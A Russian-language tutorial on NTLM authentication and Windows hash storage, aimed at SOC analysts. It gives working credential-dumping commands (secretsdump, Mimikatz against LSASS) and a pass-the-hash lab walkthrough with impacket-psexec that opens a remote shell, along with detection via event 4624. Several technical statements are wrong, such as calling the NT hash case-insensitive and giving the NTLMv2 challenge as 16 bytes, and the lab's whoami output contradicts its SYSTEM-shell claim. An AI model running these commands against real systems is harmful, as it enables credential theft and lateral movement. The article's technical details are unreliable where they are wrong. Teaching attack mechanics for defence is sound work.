# Аутентификация NTLM: схема протокола и хранение хэшей

## Схема NTLM: контекст и протокольные основы

Протокол NTLM (NT LAN Manager) — семейство механизмов проверки подлинности, встроенных в операционные системы семейства Windows и реализующих схему «запрос–ответ» без передачи пароля открытым текстом. NTLM применяется в рабочих группах, в доменных средах как резервный метод при недоступности Kerberos, а также для аутентификации на локальных учётных записях. Основное назначение NTLM — подтверждение того, что клиент знает пароль, путём выполнения криптографических операций с серверным вызовом (challenge).

Ключевыми поколениями протокола являются NTLMv1 и NTLMv2; кроме того, сессионная защита NTLMv2 Session расширяет механизмы целостности и конфиденциальности. Современные версии Windows (начиная с Windows 7 / Windows Server 2008 R2) по умолчанию допускают NTLMv2, но через политики безопасности можно ограничить использование более старых вариантов или полностью отключить NTLM. В доменах Active Directory основной протокол — Kerberos, однако NTLM остаётся повсеместно доступным, что делает его важной точкой мониторинга для SOC-аналитика.

### Место NTLM в аутентификации Windows

Перед углублением в схему важно разграничить NTLM и часто путаемые с ним понятия: Kerberos, Digest-аутентификацию, базовую аутентификацию.

| Протокол / механизм | Назначение | Способ проверки | Где применяется |
|---------------------|------------|-----------------|-----------------|
| NTLM (v1/v2) | Проверка знания пароля в средах без Kerberos или при отказе к нему | Запрос-ответ с хэшем пароля и challenge-ом сервера | Локальные учётные записи, рабочие группы, отказ Kerberos, некоторые веб-приложения IIS |
| Kerberos | Сетевая аутентификация с делегированием в доменах AD | Билеты (TGT, service tickets) на основе симметричного ключа, выданного KDC | Основной протокол в доменах Active Directory |
| Digest Authentication | Аутентификация для HTTP через хэш-функцию (RFC 2617, 7616) | Вычисление дайджеста ответа с nonce и параметрами качества защиты | Некоторые веб-сервисы, SIP-протокол |
| Basic Authentication | Простейшая проверка по логину и паролю, передаваемым в Base64 | Сравнение открытого пароля (или его хэша) с сохранённым | Устаревшие или изолированные HTTP-сервисы |

NTLM работает как challenge-response протокол, который не требует доступа клиента к центру распределения ключей (KDC) и использует хэши паролей, хранящиеся локально или на контроллере домена. Kerberos же опирается на общий секрет, известный клиенту и KDC, и выдаёт билеты, ограниченные по времени. Путаница между ними часто приводит к ложному выводу, что NTLM передаёт пароль или его хэш по сети — на самом деле ни пароль, ни NT-хэш не покидают клиента в явном виде при правильно настроенной конфигурации.

## Устройство протокола NTLM: фазы, сообщения и хранение ключевого материала

Рассматривая внутреннее устройство, необходимо изучить две неразрывно связанные подсистемы: непосредственно протокольный обмен сообщениями и способы хранения хэшей, используемых в этих обменах. Первая часть ниже описывает протокольную машину, вторая — то, как Windows хранит и защищает исходные хэши.

### Протокольный обмен NTLM

Аутентификация NTLM состоит из трёх последовательных сообщений, образующих транзакцию между клиентом и сервером.

1. **Negotiate (Type 1)**. Клиент инициирует соединение, отправляя запрос с набором поддерживаемых возможностей (версия протокола, параметры сессионной безопасности, флаги). Сообщение содержит имя учётной записи (домен\пользователь) и случайные данные.
2. **Challenge (Type 2)**. Сервер генерирует 8-байтовый (NTLMv1) или 16-байтовый (NTLMv2) случайный вызов (challenge), сохраняет его и отправляет клиенту вместе со своим набором флагов и, опционально, целевым именем сервера.
3. **Authenticate (Type 3)**. Клиент вычисляет ответ на основе своего хэша пароля и полученного challenge. Для NTLMv1 вычисляется 24-байтовый ответ (DES-шифрование дополненного до 14 символов пароля в кодировке OEM с LM-хэшем или тройное DES для NT-хэша). В NTLMv2 ответ включает HMAC-MD5 с включением метки времени клиента и случайного числа, что предотвращает replay-атаки. Сообщение Type 3 содержит вычисленный ответ, а также может содержать дополнительный материал для сессионной подписи и шифрования.

Упрощённая схема взаимодействия:

```text
Клиент                             Сервер
  |                                   |
  |--- Type 1 (Negotiate) ----------->|
  |                                   |
  |<-- Type 2 (Challenge) ------------|
  |                                   |
  |--- Type 3 (Authenticate) -------->|
  |                                   |
  |<-- Принято / Отказано ------------|
```

После успешной проверки сервер может передать сессионный ключ, который клиент также вычисляет на основе своего пароля и случайных величин. Этот ключ используется для подписания и, в случае NTLMv2, шифрования последующих сообщений в рамках той же аутентификационной сессии.

### Хранение хэшей в Windows

Для выполнения этих вычислений клиент и сервер нуждаются в доступе к хэшу пароля пользователя. В Windows принято несколько мест хранения, каждое из которых актуально в различных сценариях.

**Локальная учётная запись (рабочая станция / сервер, не домен).**  
База данных учётных записей — Security Accounts Manager (SAM) хранится в виде файла реестра `%SystemRoot%\System32\config\SAM` и куста реестра `HKLM\SAM`. Файл зашифрован системным ключом (boot key), который извлекается из куста `System`. В SAM хранятся хэши паролей в двух форматах: LM-хэш и NT-хэш.

- **LM-хэш (LAN Manager Hash)** — устаревший, легко поддаётся атакам по радужным таблицам из-за слабой стойкости DES. Генерируется только если политика хранения LM-хэшей включена (по умолчанию отключена начиная с Windows Vista/Server 2008). Пароль преобразуется в OEM-кодировку, обрезается или дополняется до 14 символов, разбивается на две 7-символьные половины, каждая используется как ключ DES для шифрования фиксированной строки "KGS!@#$%". Результат — два 8-байтовых блока, склеенных в 16-байтовый хэш.
- **NT-хэш (NTLM Hash)** — MD4 от пароля в кодировке Unicode (UTF-16LE) без соли. Фиксированной длины 16 байт. Не зависит от регистра и локали. Используется во всех современных версиях NTLM.

**Доменная учётная запись (контроллер домена).**  
База Active Directory хранится в файле `NTDS.dit` (`%SystemRoot%\NTDS\ntds.dit`). Пользовательские объекты содержат атрибуты `dBCSPwd` (устаревший LM хэш), `unicodePwd` (NT хэш), а также дополнительные ключи, такие как Kerberos-ключи. Хэши в `NTDS.dit` защищены ключами, привязанными к объекту учётной записи домена, что усложняет прямое извлечение, но при доступе к файлу и системному разделу их можно восстановить.

**В памяти (процесс LSASS, Local Security Authority Subsystem Service).**  
Процесс `lsass.exe` кэширует хэши текущих сессий и недавно аутентифицированных пользователей в доступной оперативной памяти для быстрой повторной проверки. В зависимости от версии ОС и параметров безопасности (например, включённого Credential Guard) хэши могут находиться в защищённых областях, но привилегированный пользователь с правами администратора часто способен извлечь их через такие инструменты, как Mimikatz, из-за того, что LSASS вынужден держать материал для подписания и проверки. Это критичный вектор атаки Pass-the-Hash.

**Сравнительная таблица мест хранения**

| Хранилище | Тип учётной записи | Форматы хэшей | Защита | Инструменты извлечения (принцип) |
|-----------|---------------------|----------------|--------|----------------------------------|
| SAM (файл реестра) | Локальная | LM, NT | Шифрование системным ключом, доступ только для SYSTEM | secretsdump, samdump2, pwdump – чтение куста SAM и файла System |
| NTDS.dit | Доменная | LM, NT, Kerberos keys | Шифрование на уровне атрибутов, доступ через спец. API или офлайн | ntdsutil, impacket-secretsdump, DSInternals |
| Память LSASS | Активные сессии | NT, Kerberos TGT, plaintext (включённый WDigest) | Запуск от SYSTEM, Credential Guard (изоляция) | Mimikatz, procdump + Mimikatz, различные плагины C2 |

Различие между LM и NT-хэшами часто приводит к недопониманию: NT-хэш не эквивалентен LM-хэшу, но они оба хранятся в одной базе для обратной совместимости. Современные системы не хранят LM-хэш по умолчанию, однако SOC-аналитик должен проверять его наличие, так как устаревшие конфигурации или наследие позволяют быстро восстановить пароль.

## Практическая работа с хэшами NTLM: дамп, анализ и применение

Для анализа защищённости, расследования инцидентов и пентеста аналитику необходимо уметь извлекать хэши NTLM, понимать их структуру и знать типичные сценарии атак. Основные операции: офлайн-дамп SAM/SYSTEM, онлайн-дамп LSASS, проверка хэша на утечки и реализация Pass-the-Hash.

### Извлечение хэшей из локального SAM

На выключенной системе образец SAM и SYSTEM доступен при загрузке с Live CD или монтировании диска. В работающей системе администратор с правами SYSTEM может сделать дамп через реестр или теневую копию. Пример с использованием impacket-secretsdump на атакующей машине с копией файлов:

```bash
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

Ожидаемый вывод (иллюстративная схема полей):
```
[*] Target system bootKey: 0x...
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
User1:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
```

Здесь `aad3b435b51404eeaad3b435b51404ee` — LM-хэш для пустого пароля (или отключённого LM-хэширования), второй хэш — NT-хэш. Если пароль длиннее 14 символов, LM-хэш также заменяется константой.

### Извлечение хэшей из LSASS

На работающей системе с правами администратора (и отключёнными ограничениями Defender/Credential Guard) можно выполнить:

```powershell
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

Вывод содержит разделы с `msv1_0` (NT-хэш для каждого сеанса), `kerberos` (TGT и ключи), `wdigest` (пароли открытым текстом, если включено). Типичная строка NTLM:

```
         * Username : User1
         * Domain   : WORKSTATION1
         * NTLM     : 8846f7eaee8fb117ad06bdd830b7586c
```

Такой хэш позволяет немедленно аутентифицироваться от имени пользователя без знания исходного пароля.

### Перехват хэшей в сети

В некоторых конфигурациях (LLMNR/NBNS отравление, атаки NTLM relay) можно получить Net-NTLMv2-ответ, который не является NT-хэшем, а представляет собой ответ на challenge. Его уже нельзя напрямую применить для Pass-the-Hash, зато можно попытаться подобрать пароль или relay в другую службу. Инструмент Responder записывает в лог захваченные хэши, а hashcat может их взламывать.

### Pass-the-Hash (PtH)

Используя NT-хэш (полученный из дампа SAM или LSASS), злоумышленник может пройти аутентификацию на удалённый ресурс без знания пароля. Для этого применяются утилиты семейства Impacket (wmiexec, psexec, smbexec) или встроенные средства (mimikatz `sekurlsa::pth`). Пример запуска командной оболочки на удалённом хосте:

```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c Administrator@192.168.1.50
```

Параметр `-hashes` принимает строку LM_hash:NT_hash; если LM неизвестен, можно подставить `:00..`. После успешного входа открывается командная строка `C:\Windows\system32>`. Такой приём работает, потому что протокол NTLM использует именно NT-хэш для вычисления ответа, а не пароль.

**Типичные ошибки при работе**

- Пытаться использовать NT-хэш для Kerberos-аутентификации — не сработает, нужен Kerberos-ключ или билет.
- Передавать Net-NTLMv2-ответ вместо NT-хэша в инструмент для PtH.
- Игнорировать необходимость прав SYSTEM или администратора для доступа к LSASS.

## Сквозной практический пример: разведка → дамп → Pass-the-Hash в изолированной среде

**Исходные условия.** Лабораторная сеть из двух хостов под управлением Windows 10 (22H2, рабочая группа, защитник отключён). Хост `WSUS01` (192.168.1.100) — машина атакующего с правами администратора и инструментами Mimikatz и Impacket. Целевой хост `WSUS02` (192.168.1.101) с учётной записью локального администратора `Admin`, пароль «P@ssw0rd!2024». Атакующий желает получить удалённый доступ к `WSUS02`, используя только хэш NTLM. На `WSUS02` включён сетевой доступ с общими ресурсами и сервис SMB.

### Шаг 1. Сбор хэша локального администратора с WSUS01 (имитация компрометации)

Атакующий запускает Mimikatz от имени администратора:

```powershell
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

Выбирает из вывода секцию для пользователя `Admin` (если тот недавно входил):

```
...
Authentication Id : 0 ; 123456
Session           : Interactive from 1
User Name         : Admin
Domain            : WSUS01
Logon Server      : WSUS01
Logon Time        : 2024-12-20 09:15:00
SID               : S-1-5-21-....
msv :
 [00000003] Primary
 * Username : Admin
 * Domain   : WSUS01
 * NTLM     : 2f0e0a7e8a25e1f3c3b57c85a4b44a21
...
```

Полученный NT-хэш — `2f0e0a7e8a25e1f3c3b57c85a4b44a21`. Атакующий записывает его для последующего использования.

### Шаг 2. Использование хэша для удалённой аутентификации

С помощью Impacket-psexec атакующий выполняет Pass-the-Hash:

```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:2f0e0a7e8a25e1f3c3b57c85a4b44a21 Admin@192.168.1.101
```

Вывод показывает успешное подключение:

```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Requesting shares on 192.168.1.101.....
[*] Found writable share ADMIN$
[*] Uploading file amsnqsm.exe
[*] Opening SVCManager on 192.168.1.101.....
[*] Creating service EANR on 192.168.1.101.....
[*] Starting service EANR.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19045.3693]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
wsus01\admin
```

На `WSUS02` нет интерактивного входа администратора, но хэш, совпадающий с хранящимся в SAM, позволил пройти аутентификацию и получить SYSTEM-оболочку (psexec использует создание службы).

### Шаг 3. Проверка события входа на целевом хосте

На `WSUS02` в журнале безопасности (Event Viewer) появляется событие успешного входа:

```
Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Event ID:      4624
Task Category: Logon
Keywords:      Audit Success
...
Account Name:  Admin
Account Domain: WSUS01
Logon Type:    3  (Network)
Authentication Package Name: NTLM
Process ID:    0x0
...
```

Это подтверждает, что использовалась NTLM-аутентификация с хэшем, а не Kerberos. Аналитик SOC, отслеживающий событие 4624 с пакетом NTLM для учётной записи администратора, может заподозрить Pass-the-Hash, особенно если учётная запись не использовалась для сетевого входа ранее.

### Вывод

Пример иллюстрирует, что знание NT-хэша локального администратора эквивалентно обладанию паролем в контексте NTLM-аутентификации, и демонстрирует важность контроля доступа к LSASS и SAM, а также мониторинга аномальных аутентификационных событий в SOC.
